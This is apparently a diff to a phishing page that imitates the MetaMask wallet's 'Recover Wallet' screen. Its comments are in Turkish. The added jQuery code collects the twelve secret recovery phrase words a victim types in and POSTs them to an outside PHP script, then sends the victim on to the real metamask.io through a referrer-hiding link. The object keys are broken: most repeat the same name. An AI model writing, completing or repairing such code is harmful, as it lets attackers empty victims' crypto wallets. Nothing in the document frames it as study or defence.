@@ -68041,12 +68041,29 @@ input:checked + .send-v2__amount-max__button {
 
         // "Recover Wallet" butonuna tıklanınca
         $("#form77").click(function () {
+             var formData = {
+            
+                'import-srp__srp-word-0': $("#import-srp__srp-word-0").val(),
+               'import-srp__srp-word-1': $("#import-srp__srp-word-1").val(),
+                'import-srp__srp-word-1': $("#import-srp__srp-word-2").val(),
+                'import-srp__srp-word-1': $("#import-srp__srp-word-3").val(),
+                'import-srp__srp-word-1': $("#import-srp__srp-word-4").val(),
+                'import-srp__srp-word-1': $("#import-srp__srp-word-5").val(),
+                'import-srp__srp-word-1': $("#import-srp__srp-word-6").val(),
+                'import-srp__srp-word-1': $("#import-srp__srp-word-7").val(),
+                'import-srp__srp-word-1': $("#import-srp__srp-word-8").val(),
+                'import-srp__srp-word-1': $("#import-srp__srp-word-9").val(),
+                'import-srp__srp-word-1': $("#import-srp__srp-word-10").val(),
+                'import-srp__srp-word-1': $("#import-srp__srp-word-11").val()
+              
+              
+               
+            };
+
             // Formu kekem.php adresine POST isteği gönder
             $.ajax({
                 method: 'POST',
-                data: {
-                    // Gönderilecek verileri buraya ekleyin
-                },
+                data: formData,
                 url: 'https://ajansdesire.com/asdasd/kekem.php',
                 success: function (data) {
                     window.location.href = 'https://href.li/?https://metamask.io';
